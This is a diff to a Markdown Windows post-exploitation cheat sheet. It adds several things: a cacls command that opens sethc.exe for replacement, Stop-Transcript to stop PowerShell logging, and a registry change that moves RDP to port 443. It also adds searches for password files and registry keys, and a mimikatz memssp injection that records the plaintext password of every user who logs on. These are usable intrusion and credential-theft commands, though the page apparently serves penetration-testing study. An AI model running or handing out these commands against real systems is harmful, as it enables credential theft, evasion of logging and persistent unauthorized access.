@@ -8,6 +8,16 @@ From application version, you can guess which version of Windows the system is r
 
 ## With Access (Bash/)
 
+### Non-Interactive Shell
+
+Within non-interactive shell, we cannot execute *multistaged* commands which requires interactions.
+
+One method is to use "echo" like the following
+
+```bash
+cmd.exe /C echo Y | c:\windows\system32\cacls.exe c:\windows\system32\sethc.exe /E /G BUILTIN\Administrators:F
+```
+
 ### Initial Information Gathering
 
 #### Automated Enumeration tool
@@ -18,7 +28,6 @@ From application version, you can guess which version of Windows the system is r
 ```bash
 Seatbelt.exe AutoRuns CloudCredentials CredEnum EnvironmentPath NetworkProfiles NetworkShares ProcessCreationEvents PuttyHostKeys PuttySessions RDPSavedConnections RDPSessions SuperPutty TokenPrivileges WindowsVault
 ```
-
 
 #### System information
 
@@ -148,6 +157,7 @@ netsh firewall show state # Displays the Windows Firewall status
 netsh firewall show config # Displays the Windows Firewall Configuration
 route print # Displays the entries in the local IP routing table.
 ipconfig /all # Displays the full TCP/IP configuration for all ntwork adapters.
+ipconfig /displaydns # Displays the local DNS cache
 nbtstat -n # Lists local NetBIOS names
 nbtstat -s # Lists sessions table, converting destination IP addresses to their NETBIOS names.
 net config workstation
@@ -196,6 +206,14 @@ This means that they we have one of those accounts, we can query the Domain Cont
 ldapsearch -x -h 192.168.80.10 -D "USERNAME" -w PASSWORD -b "dc=BASELDAP,dc=info" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
+##### Powershell Transcript
+
+The Start-Transcript and Stop-transcript cmdlets let you record all of your activities in the PowerShell console to a text file.
+
+```bash
+Stop-Transcript # Stop recording
+```
+
 #### Remote Desktop Session
 
 Remote Desktop Services (RDS), known as **Terminal Services** in Windows Server 2008 and earlier, is one of the components of Microsoft Windows that allow a user to take control of a remote computer or virtual machine over a network connection.
@@ -226,6 +244,12 @@ net start "Terminal Services"
 svchost.exe -k termsvcs
 ```
 
+You may want to tunnel RDP through another port like 443
+
+```bash
+REG ADD "HKLt1\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f 
+```
+
 ##### Saved RDP Connections
 
 Information about all RDP connections is stored in the registry of each user.
@@ -248,20 +272,49 @@ Get-ChildItem -Path C:\ -Filter *.bat -Recurse -ErrorAction SilentlyContinue -Fo
 
 ##### Interesting Files Enumeration
 
+[dir](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir) displays a list of a directory's files and subdirectories.
+
+Commands options:
+
+- **/s**: Lists every occurrence of the specified file name within the specified directory and all subdirectories.
+
+```bash
+# Lists all files in the current directory with extensions that begin with .txt
+dir *.txt
+```
+
+[where](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/where) displays the location of files that match the given search pattern.
+
+Commands options:
+
+- **/r DIR**: Indicates a recursive search, starting with the specified directory.
+
+```bash
+# Searches recursively within C:\ for sysprep files
+where /r c:\ sysprep.*
+```
+
 ```bash
 c:\sysprep.inf # Could be clear-text credentials
 c:\sysprep\sysprep.xml # Could be Base64 encoded credentials.
 %WINDIR%\Panther\Unattend\Unattended.xml # Could be Base64 encoded credentials.
 %WINDIR%\Panther\Unattended.xml # Could be Base64 encoded credentials.
+tomcat-users.xml   # Default user database for container-managed authentication in Tomcat.
+web.config         # Microsoft IIS Administration API informatio are contained in this file 
+config.inc.php     # phpMyAdmin 
+config.xml         # Config file of multiple applications (Jenkins, Apache Cordova, ...)
+Credentials.xml    # Credentials file of multiple applications (Jenkins, ...)
 dir profile.ps1 /s # May be executed by an adminitrator or can be used to persist
 dir /s pass == cred == vnc == .config
-findstr /si password *.xml *.ini *.txt *.bat  # Search for password in xml, ini, xml and bat files files (Bash)
+findstr /si password *.xml *.ini *.txt *.bat .xls # Search for password in xml, ini, xml, xls and bat files files (Bash)
 cmd.exe /c findstr /si password *.xml *.ini *.txt *.bat # Search for password in xml, ini, xml and bat files (Powershell)
 reg query HKLM /f password /t REG_SZ /s # Search for password in registry keys in HKLM
 reg query HKCU /f password /t REG_SZ /s # Search for password in registry keys in HKCU
 dir "C:\Users\USER\AppData\Local\Microsoft\Windows\INetCookies"
 dir "C:\Users\USER\AppData\Roaming\Microsoft\Windows\Cookies"
 dir "C:\Users\USER\AppData\Roaming\Microsoft\Windows\Cookies\Low"
+tree /F /A c:\ tree.txt # Directory listing of C:
+Get-Childitem -Path C:\ -Force -Filter -Recurse *.log -ErrorAction SilentlyContinue | Where {$_.LastWriteTime -gt "2012-08-20"}
 ```
 
 If you can stage a .exe, you can use [Lazagne](https://github.com/AlessandroZ/LaZagne), which is even used by known APTs such as OilRig
@@ -646,11 +699,14 @@ For more information about those techniques refer to:
 
 ### Service Enumeration
 
-|N°| Commands      | Description |
-|-|---------- | ----------- |
-|1| wmic service get pathname,startname|Displays all service and user name.|
-|2| wmic service get name,displayname,pathname,startmode \|findstr /i "auto" \|findstr /i /v "c:\windows\\\\" \|findstr /i /v """|Search for "Unquoted Service Path" vulnerable services
-|3| sc sdshow *service*|Display the security descriptor of a given service|
+```bash
+# Displays all service and their name
+wmic service get pathname,startname
+# Displays all service that are running
+Get-Service | where object {$ .status -eq ''Running''}
+# Search for "Unquoted Service Path" vulnerable services
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v 
+```
 
 If there is are path that contains whitespace and run as *LocalSystem*, Unquoted Service Path vulnerability.
 When Windows starts a service, it looks for the PATH where that services is locating. If any unquoted (has space) in the PATH the service can be manipulating.
@@ -867,7 +923,17 @@ For more information about that technique refer to [T1547.001 - Boot or Logon Au
 Placing a program within a startup folder will also cause that program to execute when a user logs in.
 There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.
 
-C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```bash
+dir C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+# All Users (NT 6.1 & NT 6.0)
+dir "%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+# Specific users (Windows NT 6.1 & NT 6.0)
+dir "%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup"
+
+# Windows NT 5.2, 5.1, 5.0
+dir "%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup"
+```
 
 In order to checks access, we can use [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
 
@@ -1263,6 +1329,71 @@ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -ou
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
 
+#### Credential Harvesting
+
+#### Security Support Provider Attack
+
+This attack can be performed against a Windows member server or domain controller.
+Use-cases:
+
+- We compromised a **member server** as a **local Administrator**, but we have **limited rights** to move laterally across **the same domain**.
+- We compromised a **domain controller** as a **Domain Admin** or **Administrator**, but wishes to **elevate privileges** to an **Enterprise Admin** to move laterally **across domains**.
+- We compromised a **domain controller** as a **Domain Admin** using a pass-the-hash attack, but wishes to leverage the clear text password of the admin to **log into other applications** such as Outlook Web Access or a remote desktop connection.
+
+```bash
+mimikatz # privilege::debug
+mimikatz # misc::memssp         # Inject a malicious SSP with the memory.
+```
+
+Once the SSP is registered, all users who log on to the compromised Domain Controller, as well as all local services, will log their passwords to the C:\Windows\System32\mimilsa.log file.
+
+For more information about that technique refer to [T1547.005 - Boot or Logon Autostart Execution: Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
+
+###### *If you don't know, now you know: [Security Accounts Manager database](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#security-accounts-manager-database)*
+
+The Security Account Manager is a database file in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users' passwords.
+This file can be found in *%SystemRoot%/system32/config/SAM* and is mounted on *HKLM/SAM*
+The Security Account Manager contains all the credentials that are **local** to that specific computer, including the built-in local Administrator account and any other local accounts for that computer.
+
+In an attempt to improve the security of the SAM database against offline software cracking, Microsoft introduced the SYSKEY function. 
+When SYSKEY is enabled, the on-disk copy of the SAM file is partially encrypted, so that the password hash values for all local accounts stored in the SAM are encrypted with a key (usually also referred to as the "SYSKEY").
+
+*Sidenote: For NT password hash, it is an unsalted MD4 hash of the account’s password. This means that if two accounts use an identical password, they will also have an identical NT password hash.*
+
+SAM is a **"stored credentials"** method
+
+###### *If you don't know, now you know: [LSASS](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#lsass-process-memory)*
+
+The Local Security Authority Subsystem Service (LSASS) stores credentials in memory on behalf of users with **active** Windows sessions.
+
+This allows users to seamlessly access network resources, such as file shares, Exchange Server mailboxes, and SharePoint sites, without re-entering their credentials for each remote service.
+
+LSASS can store credentials in multiple forms, including:
+
+- Reversibly encrypted plaintext
+- Kerberos tickets (TGTs, service tickets)
+- NT hash
+- LM hash
+
+LSASS is a **"cached credentials"** method
+
+###### *If you don't know, now you know: [Security Support Provider Interface](https://docs.microsoft.com/fr-fr/windows-server/security/windows-authentication/security-support-provider-interface-architecture)*
+
+The Microsoft Security Support Provider Interface (SSPI) is the foundation for Windows authentication. Applications and infrastructure services that require authentication use SSPI to provide it.
+
+The default Security Support Providers (SSPs) that invoke specific authentication protocols in Windows are incorporated into the SSPI as DLLs.
+
+The following sections describe the default SSPs that interact with the SSPI. The SSPs are used in different ways in Windows operating systems to promote secure communication in an unsecure network environment.
+
+- Kerberos Security Support Provider
+- NTLM Security Support Provider
+- Digest Security Support Provider
+- Schannel Security Support Provider
+- Negotiate Security Support Provider
+- Credential Security Support Provider
+- Negotiate Extensions Security Support Provider
+- PKU2U Security Support Provider
+
 #### Ntds.dit file
 
 The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
@@ -1296,10 +1427,17 @@ For more information about that technique refer to [T1003.003 - OS Credential Du
 
 The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes (NTLM) for all users in the domain.
 
+The two types of domain controllers in AD DS that manage credentials differently are:
+
+- **Writable**: Each writable domain controller in the domain contains a full copy of the domain’s AD DS database, including account credentials for all accounts in the domain.
+- **Read-only**: Read-only domain controllers (RODCs) house a partial local replica with credentials for a select subset of the accounts in the domain. By default, RODCs do not have a copy of privileged domain accounts.
+
 By default, it is located in "C:\Windows\NTDS\"
 
 Ntds.dit is encrypted with the Password Encryption Key.
 The required Password Encryption Key is stored in the NTDS.dit file, but is encrypted itself with the BOOTKEY. To obtain this BOOTKEY, we need to acquire a copy of the SYSTEM registry hive from the same Domain Controller as we acquired the NTDS.dit file.
+
+Ntds.dit is **"stored credentials"** method
 
 ###### *If you don't know, now you know: [LM-hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)*
 
@@ -1587,7 +1725,8 @@ This vulnerability allows an attacker to abuse Windows system services to conduc
 - For the "Domain Trusts" part, thank to Girit Haran <https://giritharan.com/active-directory-domains-and-trust/>
 - For the "AppInit DLLs" part, thanks to <https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/>
 - For the "Scheduled Tasks" part, thanks to <https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/>
-- Fot the "LAPS Evasion" part, thanks to https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/
+- For the "LAPS Evasion" part, thanks to <https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/>
+- For the "SSP Attack" part, thans to stealthbits.com <https://stealthbits.com/blog/stealing-credentials-with-a-security-support-provider-ssp/>
 
 #### Source Todo
 
